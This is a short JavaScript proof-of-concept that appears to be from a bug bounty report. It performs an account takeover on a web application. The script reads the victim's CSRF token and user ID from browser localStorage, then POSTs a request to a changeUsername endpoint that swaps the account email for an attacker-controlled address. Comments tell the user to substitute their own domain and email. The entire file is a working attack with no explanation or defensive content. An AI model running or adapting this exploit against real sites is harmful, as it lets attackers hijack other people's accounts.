const getCSRFToken = async function() {
    const csrfToken = await localStorage.getItem('csrfToken');
    return csrfToken;
}

const getUserID = async function(){
    const userId = await localStorage.getItem('awc.ui.viewed.last.sent').split(':')[0].split('"')[1]
    return userId;
}

const exploit = async function() {

    const csrfToken = await getCSRFToken();
    const userId = await getUserID();

    console.log(csrfToken);
    console.log(userId)

    // Change the subdomain to your subdomain
    const URI = "https://accounttakeoverpoc.domain.com/user/changeUsername";

    // Change the Email to a controlled by you :)
    const newEmail = "fadodu@tech5group.com"

    const payload = {
        userId: userId,
        username: newEmail
    }

    console.log(payload)

    const params = {
        headers: {
            'Content-Type': 'application/json',
            'csrf-token': csrfToken,
        },
        body: JSON.stringify(payload),
        method: 'POST'
    }

    fetch(URI, params)
        .then((response) => {
            console.log('Email Changed :) ', response)
        })
        .catch((error) => {
            console.log('Error: ', error)
        })

}

exploit()